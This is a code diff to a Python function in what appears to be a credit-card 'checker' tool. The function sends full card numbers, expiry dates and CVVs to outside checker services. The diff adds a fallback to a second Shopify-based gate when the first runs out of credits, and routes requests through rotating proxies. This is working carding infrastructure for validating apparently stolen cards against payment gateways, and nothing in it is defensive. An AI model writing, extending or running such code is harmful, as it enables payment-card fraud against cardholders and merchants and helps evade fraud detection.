@@ -827,26 +827,46 @@ def check_stv_gate(version, cc, mm, yy, cvv):
 
 
 def check_shopii_gate(pack, cc, mm, yy, cvv):
-    """Shopii #1-4 via cyborxchecker.com auto-gate"""
+    """Shopii #1-4 — tries cyborxchecker first, falls back to Netherex Shopify"""
     start_time = time_module.time()
+    year = f'20{yy}' if len(yy) == 2 else yy
+    card_str = f'{cc}|{mm}|{year}|{cvv}'
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+
     try:
-        year = f'20{yy}' if len(yy) == 2 else yy
-        card_str = f'{cc}|{mm}|{year}|{cvv}'
         params = {'card': card_str, 'pack': pack}
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
-        resp = requests.get(CYBOR_SHOPII_URL, params=params, headers=headers, timeout=40)
+        resp = requests.get(CYBOR_SHOPII_URL, params=params, headers=headers, timeout=15)
         elapsed = time_module.time() - start_time
-        if resp.status_code == 200:
+        if resp.status_code == 200 and resp.text.strip():
+            low = resp.text.lower()
+            if not any(k in low for k in ['no have credits', 'no credits', 'out of credits',
+                                           'buy credits', 'credit limit', 'api limit']):
+                try:
+                    data = resp.json()
+                except Exception:
+                    data = {}
+                return _parse_cybor_response(resp.text, data, elapsed)
+    except Exception:
+        pass
+
+    try:
+        params2 = {'card': card_str, 'auth': NETHEREX_SHOPIFY_AUTH}
+        proxy = _get_shopify_proxy()
+        if proxy:
+            params2['proxy'] = proxy
+        resp2 = requests.get(NETHEREX_SHOPIFY_URL, params=params2, headers=headers, timeout=30)
+        elapsed = time_module.time() - start_time
+        if resp2.status_code == 200:
             try:
-                data = resp.json()
+                data2 = resp2.json()
             except Exception:
-                data = {}
-            return _parse_cybor_response(resp.text, data, elapsed)
-        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
-    except requests.Timeout:
-        return {'status': 'error', 'message': 'Request timeout', 'time': 40}
-    except Exception as e:
-        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
+                data2 = {}
+            return _parse_cybor_response(resp2.text, data2, elapsed)
+    except Exception:
+        pass
+
+    elapsed = time_module.time() - start_time
+    return {'status': 'error', 'message': 'Shopify gate temporarily unavailable', 'time': round(elapsed, 2)}
 
 
 def check_skbased_gate(cc, mm, yy, cvv, sk_key=None):
